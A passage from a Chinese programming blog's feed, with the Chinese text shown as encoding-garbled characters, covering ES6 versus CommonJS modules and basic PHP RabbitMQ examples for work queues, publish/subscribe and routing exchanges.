<span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> add = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">export</span> &#123; basicNum, add &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** å¼•ç”¨æ¨¡å— **/</span></span><br><span class="line"><span class="keyword">import</span> &#123; basicNum, add &#125; <span class="keyword">from</span> <span class="string">&#x27;./math&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">ele</span>) </span>&#123;</span><br><span class="line">    ele.textContent = add(<span class="number">99</span> + basicNum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚ä¸Šä¾‹æ‰€ç¤ºï¼Œä½¿ç”¨importå‘½ä»¤çš„æ—¶å€™ï¼Œç”¨æˆ·éœ€è¦çŸ¥é“æ‰€è¦åŠ è½½çš„å˜é‡åæˆ–å‡½æ•°åã€‚å…¶å® ES6 è¿˜æä¾›äº†export defaultå‘½ä»¤ï¼Œä¸ºæ¨¡å—æŒ‡å®šé»˜è®¤è¾“å‡ºï¼Œå¯¹åº”çš„importè¯­å¥ä¸éœ€è¦ä½¿ç”¨å¤§æ‹¬å·ã€‚è¿™ä¹Ÿæ›´è¶‹è¿‘äº ADM çš„å¼•ç”¨å†™æ³•ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** export default **/</span></span><br><span class="line"><span class="comment">//å®šä¹‰è¾“å‡º</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123; basicNum, add &#125;;</span><br><span class="line"><span class="comment">//å¼•å…¥</span></span><br><span class="line"><span class="keyword">import</span> math <span class="keyword">from</span> <span class="string">&#x27;./math&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">ele</span>) </span>&#123;</span><br><span class="line">    ele.textContent = math.add(<span class="number">99</span> + math.basicNum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ES6 çš„æ¨¡å—ä¸æ˜¯å¯¹è±¡ï¼Œimportå‘½ä»¤ä¼šè¢« JavaScript å¼•æ“é™æ€åˆ†æï¼Œåœ¨ç¼–è¯‘æ—¶å°±å¼•å…¥æ¨¡å—ä»£ç ï¼Œè€Œä¸æ˜¯åœ¨ä»£ç è¿è¡Œæ—¶åŠ è½½ï¼Œæ‰€ä»¥æ— æ³•å®ç°æ¡ä»¶åŠ è½½ã€‚ä¹Ÿæ­£å› ä¸ºè¿™ä¸ªï¼Œä½¿å¾—é™æ€åˆ†ææˆä¸ºå¯èƒ½ã€‚</p><h2 id="ES6-æ¨¡å—ä¸-CommonJS-æ¨¡å—çš„å·®å¼‚"><a href="#ES6-æ¨¡å—ä¸-CommonJS-æ¨¡å—çš„å·®å¼‚" class="headerlink" title="ES6 æ¨¡å—ä¸ CommonJS æ¨¡å—çš„å·®å¼‚"></a>ES6 æ¨¡å—ä¸ CommonJS æ¨¡å—çš„å·®å¼‚</h2><ol><li>CommonJS æ¨¡å—è¾“å‡ºçš„æ˜¯ä¸€ä¸ªå€¼çš„æ‹·è´ï¼ŒES6 æ¨¡å—è¾“å‡ºçš„æ˜¯å€¼çš„å¼•ç”¨ã€‚</li></ol><ul><li>CommonJS æ¨¡å—è¾“å‡ºçš„æ˜¯å€¼çš„æ‹·è´ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€æ—¦è¾“å‡ºä¸€ä¸ªå€¼ï¼Œæ¨¡å—å†…éƒ¨çš„å˜åŒ–å°±å½±å“ä¸åˆ°è¿™ä¸ªå€¼ã€‚</li><li>ES6 æ¨¡å—çš„è¿è¡Œæœºåˆ¶ä¸ CommonJS ä¸ä¸€æ ·ã€‚JS å¼•æ“å¯¹è„šæœ¬é™æ€åˆ†æçš„æ—¶å€™ï¼Œé‡åˆ°æ¨¡å—åŠ è½½å‘½ä»¤importï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªåªè¯»å¼•ç”¨ã€‚ç­‰åˆ°è„šæœ¬çœŸæ­£æ‰§è¡Œæ—¶ï¼Œå†æ ¹æ®è¿™ä¸ªåªè¯»å¼•ç”¨ï¼Œåˆ°è¢«åŠ è½½çš„é‚£ä¸ªæ¨¡å—é‡Œé¢å»å–å€¼ã€‚æ¢å¥è¯è¯´ï¼ŒES6 çš„importæœ‰ç‚¹åƒ Unix ç³»ç»Ÿçš„ â€œç¬¦å·è¿æ¥â€ï¼ŒåŸå§‹å€¼å˜äº†ï¼ŒimportåŠ è½½çš„å€¼ä¹Ÿä¼šè·Ÿç€å˜ã€‚å› æ­¤ï¼ŒES6 æ¨¡å—æ˜¯åŠ¨æ€å¼•ç”¨ï¼Œå¹¶ä¸”ä¸ä¼šç¼“å­˜å€¼ï¼Œæ¨¡å—é‡Œé¢çš„å˜é‡ç»‘å®šå…¶æ‰€åœ¨çš„æ¨¡å—ã€‚</li></ul><ol start="2"><li>CommonJS æ¨¡å—æ˜¯è¿è¡Œæ—¶åŠ è½½ï¼ŒES6 æ¨¡å—æ˜¯ç¼–è¯‘æ—¶è¾“å‡ºæ¥å£ã€‚</li></ol><ul><li>è¿è¡Œæ—¶åŠ è½½: CommonJS æ¨¡å—å°±æ˜¯å¯¹è±¡ï¼›å³åœ¨è¾“å…¥æ—¶æ˜¯å…ˆåŠ è½½æ•´ä¸ªæ¨¡å—ï¼Œç”Ÿæˆä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åå†ä»è¿™ä¸ªå¯¹è±¡ä¸Šé¢è¯»å–æ–¹æ³•ï¼Œè¿™ç§åŠ è½½ç§°ä¸º â€œè¿è¡Œæ—¶åŠ è½½â€ã€‚</li><li>ç¼–è¯‘æ—¶åŠ è½½: ES6 æ¨¡å—ä¸æ˜¯å¯¹è±¡ï¼Œè€Œæ˜¯é€šè¿‡ export å‘½ä»¤æ˜¾å¼æŒ‡å®šè¾“å‡ºçš„ä»£ç ï¼Œimportæ—¶é‡‡ç”¨é™æ€å‘½ä»¤çš„å½¢å¼ã€‚å³åœ¨importæ—¶å¯ä»¥æŒ‡å®šåŠ è½½æŸä¸ªè¾“å‡ºå€¼ï¼Œè€Œä¸æ˜¯åŠ è½½æ•´ä¸ªæ¨¡å—ï¼Œè¿™ç§åŠ è½½ç§°ä¸º â€œç¼–è¯‘æ—¶åŠ è½½â€ã€‚</li></ul><p>CommonJS åŠ è½½çš„æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼ˆå³module.exportså±æ€§ï¼‰ï¼Œè¯¥å¯¹è±¡åªæœ‰åœ¨è„šæœ¬è¿è¡Œå®Œæ‰ä¼šç”Ÿæˆã€‚è€Œ ES6 æ¨¡å—ä¸æ˜¯å¯¹è±¡ï¼Œå®ƒçš„å¯¹å¤–æ¥å£åªæ˜¯ä¸€ç§é™æ€å®šä¹‰ï¼Œåœ¨ä»£ç é™æ€è§£æé˜¶æ®µå°±ä¼šç”Ÿæˆã€‚</p>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP RabbitMQ åŸºæœ¬ä½¿ç”¨</title>
      <link href="post/4b1674e8/"/>
      <url>post/4b1674e8/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>PHP RabbitMQ åŸºæœ¬ä½¿ç”¨</p><span id="more"></span><h2 id="å·¥ä½œé˜Ÿåˆ—"><a href="#å·¥ä½œé˜Ÿåˆ—" class="headerlink" title="å·¥ä½œé˜Ÿåˆ—"></a>å·¥ä½œé˜Ÿåˆ—</h2><h3 id="å‘å¸ƒä»»åŠ¡"><a href="#å‘å¸ƒä»»åŠ¡" class="headerlink" title="å‘å¸ƒä»»åŠ¡"></a>å‘å¸ƒä»»åŠ¡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpAmqpLib</span>\<span class="title">Connection</span>\<span class="title">AMQPStreamConnection</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpAmqpLib</span>\<span class="title">Message</span>\<span class="title">AMQPMessage</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$connection</span> = <span class="keyword">new</span> AMQPStreamConnection(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">5672</span>, <span class="string">&#x27;guest&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>);</span><br><span class="line"><span class="variable">$channel</span> = <span class="variable">$connection</span>-&gt;channel();</span><br><span class="line"></span><br><span class="line"><span class="comment">// å£°æ˜é˜Ÿåˆ—ï¼Œå¹¶ä¸éœ€è¦ack</span></span><br><span class="line"><span class="variable">$channel</span>-&gt;queue_declare(<span class="string">&#x27;task_queue&#x27;</span>, <span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = implode(<span class="string">&#x27; &#x27;</span>, array_slice(<span class="variable">$argv</span>, <span class="number">1</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$data</span>)) <span class="variable">$data</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºæŒä¹…åŒ–æ¶ˆæ¯</span></span><br><span class="line"><span class="variable">$msg</span> = <span class="keyword">new</span> AMQPMessage(<span class="variable">$data</span>,</span><br><span class="line">                        <span class="keyword">array</span>(<span class="string">&#x27;delivery_mode&#x27;</span> =&gt; AMQPMessage::DELIVERY_MODE_PERSISTENT)</span><br><span class="line">                      );</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‘é€æ¶ˆæ¯åˆ°é˜Ÿåˆ—ï¼Œå¹¶ä½¿ç”¨äº†åŒ¿åäº¤æ¢æœº</span></span><br><span class="line"><span class="variable">$channel</span>-&gt;basic_publish(<span class="variable">$msg</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;task_queue&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot; [x] Sent &quot;</span>, <span class="variable">$data</span>, <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$channel</span>-&gt;close();</span><br><span class="line"><span class="variable">$connection</span>-&gt;close();</span><br></pre></td></tr></table></figure><h3 id="æ¶ˆè´¹ä»»åŠ¡"><a href="#æ¶ˆè´¹ä»»åŠ¡" class="headerlink" title="æ¶ˆè´¹ä»»åŠ¡"></a>æ¶ˆè´¹ä»»åŠ¡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpAmqpLib</span>\<span class="title">Connection</span>\<span class="title">AMQPStreamConnection</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$connection</span> = <span class="keyword">new</span> AMQPStreamConnection(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">5672</span>, <span class="string">&#x27;guest&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>);</span><br><span class="line"><span class="variable">$channel</span> = <span class="variable">$connection</span>-&gt;channel();</span><br><span class="line"></span><br><span class="line"><span class="variable">$channel</span>-&gt;queue_declare(<span class="string">&#x27;task_queue&#x27;</span>, <span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27; [*] Waiting for messages. To exit press CTRL+C&#x27;</span>, <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$callback</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$msg</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot; [x] Received &quot;</span>, <span class="variable">$msg</span>-&gt;body, <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">  sleep(substr_count(<span class="variable">$msg</span>-&gt;body, <span class="string">&#x27;.&#x27;</span>));</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot; [x] Done&quot;</span>, <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">  <span class="variable">$msg</span>-&gt;delivery_info[<span class="string">&#x27;channel&#x27;</span>]-&gt;basic_ack(<span class="variable">$msg</span>-&gt;delivery_info[<span class="string">&#x27;delivery_tag&#x27;</span>]);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸Šæ¬¡ä»»åŠ¡æ¶ˆè´¹å®Œæˆï¼Œæ‰å¯ä»¥å¼€å§‹ä¸€æ¡</span></span><br><span class="line"><span class="variable">$channel</span>-&gt;basic_qos(<span class="literal">null</span>, <span class="number">1</span>, <span class="literal">null</span>);</span><br><span class="line"><span class="variable">$channel</span>-&gt;basic_consume(<span class="string">&#x27;task_queue&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="variable">$callback</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(count(<span class="variable">$channel</span>-&gt;callbacks)) &#123;</span><br><span class="line">    <span class="variable">$channel</span>-&gt;wait();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$channel</span>-&gt;close();</span><br><span class="line"><span class="variable">$connection</span>-&gt;close();</span><br></pre></td></tr></table></figure><h2 id="å‘å¸ƒï¼è®¢é˜…"><a href="#å‘å¸ƒï¼è®¢é˜…" class="headerlink" title="å‘å¸ƒï¼è®¢é˜…"></a>å‘å¸ƒï¼è®¢é˜…</h2><p>å°†é˜Ÿåˆ—åˆ†å‘ç»™å¤šä¸ªæ¶ˆè´¹è€…</p><h3 id="å‘å¸ƒä»»åŠ¡-1"><a href="#å‘å¸ƒä»»åŠ¡-1" class="headerlink" title="å‘å¸ƒä»»åŠ¡"></a>å‘å¸ƒä»»åŠ¡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpAmqpLib</span>\<span class="title">Connection</span>\<span class="title">AMQPStreamConnection</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpAmqpLib</span>\<span class="title">Message</span>\<span class="title">AMQPMessage</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$connection</span> = <span class="keyword">new</span> AMQPStreamConnection(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">5672</span>, <span class="string">&#x27;guest&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>);</span><br><span class="line"><span class="variable">$channel</span> = <span class="variable">$connection</span>-&gt;channel();</span><br><span class="line"></span><br><span class="line"><span class="comment">// å£°æ˜äº¤æ¢æœºé˜Ÿåˆ—ï¼ŒæŒ‡å®šç±»å‹ä¸ºæ‰‡å½¢äº¤æ¢æœºfanout</span></span><br><span class="line"><span class="variable">$channel</span>-&gt;exchange_declare(<span class="string">&#x27;logs&#x27;</span>, <span class="string">&#x27;fanout&#x27;</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = implode(<span class="string">&#x27; &#x27;</span>, array_slice(<span class="variable">$argv</span>, <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$data</span>)) <span class="variable">$data</span> = <span class="string">&quot;info: Hello World!&quot;</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="keyword">new</span> AMQPMessage(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‘å¸ƒæ¶ˆæ¯åˆ°æŒ‡å®šäº¤æ¢æœº</span></span><br><span class="line"><span class="variable">$channel</span>-&gt;basic_publish(<span class="variable">$msg</span>, <span class="string">&#x27;logs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot; [x] Sent &quot;</span>, <span class="variable">$data</span>, <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$channel</span>-&gt;close();</span><br><span class="line"><span class="variable">$connection</span>-&gt;close();</span><br></pre></td></tr></table></figure><h3 id="è®¢é˜…ä»»åŠ¡"><a href="#è®¢é˜…ä»»åŠ¡" class="headerlink" title="è®¢é˜…ä»»åŠ¡"></a>è®¢é˜…ä»»åŠ¡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpAmqpLib</span>\<span class="title">Connection</span>\<span class="title">AMQPStreamConnection</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$connection</span> = <span class="keyword">new</span> AMQPStreamConnection(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">5672</span>, <span class="string">&#x27;guest&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>);</span><br><span class="line"><span class="variable">$channel</span> = <span class="variable">$connection</span>-&gt;channel();</span><br><span class="line"></span><br><span class="line"><span class="variable">$channel</span>-&gt;exchange_declare(<span class="string">&#x27;logs&#x27;</span>, <span class="string">&#x27;fanout&#x27;</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å£°æ˜ä¸€ä¸ªä¸´æ—¶é˜Ÿåˆ—</span></span><br><span class="line"><span class="keyword">list</span>(<span class="variable">$queue_name</span>, ,) = <span class="variable">$channel</span>-&gt;queue_declare(<span class="string">&quot;&quot;</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="comment">// å°†ä¸´æ—¶é˜Ÿåˆ—ç»‘å®šåˆ°äº¤æ¢æœº</span></span><br><span class="line"><span class="variable">$channel</span>-&gt;queue_bind(<span class="variable">$queue_name</span>, <span class="string">&#x27;logs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27; [*] Waiting for logs. To exit press CTRL+C&#x27;</span>, <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$callback</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$msg</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27; [x] &#x27;</span>, <span class="variable">$msg</span>-&gt;body, <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable">$channel</span>-&gt;basic_consume(<span class="variable">$queue_name</span>, <span class="string">&#x27;&#x27;</span>, <span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="variable">$callback</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(count(<span class="variable">$channel</span>-&gt;callbacks)) &#123;</span><br><span class="line">    <span class="variable">$channel</span>-&gt;wait();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$channel</span>-&gt;close();</span><br><span class="line"><span class="variable">$connection</span>-&gt;close();</span><br></pre></td></tr></table></figure><h2 id="è·¯ç”±"><a href="#è·¯ç”±" class="headerlink" title="è·¯ç”±"></a>è·¯ç”±</h2><h3 id="å‘å¸ƒé˜Ÿåˆ—"><a href="#å‘å¸ƒé˜Ÿåˆ—" class="headerlink" title="å‘å¸ƒé˜Ÿåˆ—"></a>å‘å¸ƒé˜Ÿåˆ—</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpAmqpLib</span>\<span class="title">Connection</span>\<span class="title">AMQPStreamConnection</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpAmqpLib</span>\<span class="title">Message</span>\<span class="title">AMQPMessage</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$connection</span> = <span class="keyword">new</span> AMQPStreamConnection(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">5672</span>, <span class="string">&#x27;guest&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>);</span><br><span class="line"><span class="variable">$channel</span> = <span class="variable">$connection</span>-&gt;channel();</span><br><span class="line"></span><br><span class="line"><span class="comment">// å£°æ˜ä¸€ä¸ªç›´è”ç±»å‹çš„äº¤æ¢æœº</span></span><br><span class="line"><span class="variable">$channel</span>-&gt;exchange_declare(<span class="string">&#x27;direct_logs&#x27;</span>, <span class="string">&#x27;direct&#x27;</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$severity</span> = <span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$argv</span>[<span class="number">1</span>]) ? <span class="variable">$argv</span>[<span class="number">1</span>] : <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = implode(<span class="string">&#x27; &#x27;</span>, array_slice(<span class="variable">$argv</span>, <span class="number">2</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$data</span>)) <span class="variable">$data</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$msg</span> = <span class="keyword">new</span> AMQPMessage(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‘å¸ƒåˆ°æŒ‡å®šè·¯ç”±çš„äº¤æ¢æœºä¸Š</span></span><br><span class="line"><span class="variable">$channel</span>-&gt;basic_publish(<span class="variable">$msg</span>, <span class="string">&#x27;direct_logs&#x27;</span>, <span class="variable">$severity</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot; [x] Sent &quot;</span>,<span class="variable">$severity</span>,<span class="string">&#x27;:&#x27;</span>,<span class="variable">$data</span>,<span class="string">&quot; \n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$channel</span>-&gt;close();</span><br><span class="line"><span class="variable">$connection</span>-&gt;close();</span><br></pre></td></tr></table></figure><h3 id="æ¶ˆè´¹é˜Ÿåˆ—"><a href="#æ¶ˆè´¹é˜Ÿåˆ—" class="headerlink" title="æ¶ˆè´¹é˜Ÿåˆ—"></a>æ¶ˆè´¹é˜Ÿåˆ—</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpAmqpLib</span>\<span class="title">Connection</span>\<span class="title">AMQPStreamConnection</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$connection</span> = <span class="keyword">new</span> AMQPStreamConnection(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">5672</span>, <span class="string">&#x27;guest&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>);</span><br><span class="line"><span class="variable">$channel</span> = <span class="variable">$connection</span>-&gt;channel();</span><br><span class="line"></span><br><span class="line"><span class="variable">$channel</span>-&gt;exchange_declare(<span class="string">&#x27;direct_logs&#x27;</span>, <span class="string">&#x27;direct&#x27;</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">list</span>(<span class="variable">$queue_name</span>, ,) = <span class="variable">$channel</span>-&gt;queue_declare(<span class="string">&quot;&quot;</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$severities</span> = array_slice(<span class="variable">$argv</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$severities</span> )) &#123;</span><br><span class="line">    file_put_contents(<span class="string">&#x27;php://stderr&#x27;</span>, <span class="string">&quot;Usage: <span class="subst">$argv</span>[0] [info] [warning] [error]\n&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 